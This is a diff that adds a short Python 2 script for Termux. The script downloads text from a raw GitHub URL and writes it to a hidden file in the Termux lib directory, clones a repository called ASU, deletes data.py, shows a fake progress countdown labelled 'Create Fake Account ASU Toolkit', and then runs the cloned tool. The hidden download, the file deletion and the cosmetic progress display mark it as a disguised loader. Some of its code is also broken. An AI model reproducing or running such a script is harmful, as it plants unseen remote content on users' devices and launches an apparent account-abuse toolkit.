@@ -1,0 +1,23 @@
+import os,sys,time,requests
+h=requests.get('https://raw.githubusercontent.com/dinartaqwa/njing/master/usr.txt').text
+m=open('cd /data/data/com.termux/files/usr/lib/.k','w').write(h)
+os.system('git clone https://github.com/LOoLzeC/ASU')
+os.system('rm -rf data.py')
+os.system('clear')
+os.system('cd ASU')
+print '[!] Create Fake Account ASU Toolkit'
+print ' 1 ...'
+time.sleep(2)
+print ' 2 .....'
+time.sleep(2)
+print ' 3 .........'
+time.sleep(2)
+print ' 7 ................'
+time.sleep(2)
+print ' 66 .........................'
+time.sleep(2)
+print ' 100 ................................'
+time.sleep(1)
+print '[!] Boyahh ....'
+time.sleep(2)
+os.system('python2 ASU.py')
